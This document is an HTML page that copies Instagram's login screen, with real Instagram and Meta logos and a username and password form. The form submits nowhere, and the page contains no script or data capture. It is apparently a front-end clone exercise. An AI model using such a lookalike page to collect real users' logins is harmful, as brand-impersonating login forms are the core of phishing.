<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram – Log In</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="main-wrapper">
    
    <div class="left-side">
      <header class="header-logo">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram logo" class="logo">
      </header>
      
      <section class="intro">
        <h1>See everyday moments from your <span class="close-friends">close friends</span>.</h1>
        <div class="photos">
          <img src="https://static.cdninstagram.com/rsrc.php/v4/yD/r/nWfBjz-5_uf.png" alt="Photos" class="photo-mockup">
        </div>
      </section>
    </div>

    <aside class="right-side">
      <div class="login-box">
        <p class="login-title">Log in to Instagram</p>
        
        <form action="#" method="post" class="login-form">
          <input type="text" name="email" placeholder="Mobile number, username or email address" required>
          <input type="password" name="password" placeholder="Password" required>
          <button type="submit" class="login-btn">Log In</button>
        </form>

        <a href="#" class="forgot-password">Forgotten password?</a>

        <div class="social-login">
          <a href="#" class="facebook-link">Log in with Facebook</a>
        </div>

        <div class="divider"></div>

        <a href="#" class="create-account-btn">Create new account</a>
        
        <div class="meta-container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1280px-Meta_Platforms_Inc._logo.svg.png" alt="Meta" class="meta-logo">
        </div>
      </div>
    </aside>
  </div>

  <footer class="page-footer">
    <div class="footer-links">
      <span>Meta</span><span>About</span><span>Blog</span><span>Jobs</span><span>Help</span><span>API</span><span>Privacy</span><span>Terms</span>
    </div>
    <p>© 2026 Instagram from Meta</p>
  </footer>
</body>
</html>
